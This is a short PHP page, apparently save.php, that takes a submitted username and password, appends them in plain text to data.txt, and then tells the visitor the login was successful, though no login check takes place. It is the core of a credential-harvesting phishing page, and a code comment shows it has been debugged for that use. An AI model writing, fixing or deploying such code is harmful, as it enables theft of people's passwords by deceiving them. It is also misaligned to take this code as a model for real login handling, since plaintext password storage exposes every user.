<!DOCTYPE html>
<html>
<head>
<title>Login Succesful!</title>
</head>
<body>

<?php
// save.php

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Check if the expected form fields actually exist
    if (isset($_POST['uname']) && isset($_POST['psw'])) {
        
        // 1. Get the text and format it
        $text_to_save = $_POST['uname'] . " - " . $_POST['psw'] . PHP_EOL;
        
        // 2. Specify the filename
        $filename = "data.txt";

        // 3. Open the file in 'append' mode ("a")
        $file_handle = fopen($filename, "a");

        // 4. Write the text and close the file
        if ($file_handle) {
            fwrite($file_handle, $text_to_save);
            fclose($file_handle);
            // BUG FIXED HERE: Changed 'content' to 'uname'
            echo "Successfully saved data for: " . htmlspecialchars($_POST['uname']);
        } else {
            echo "Error: Could not open file for writing.";
        }
    } else {
        echo "Error: Form data is missing.";
    }
}
?>

<h1>Login Was Succesful.</h1>
<p>You can now head back to the main page!</p>

</body>
</html>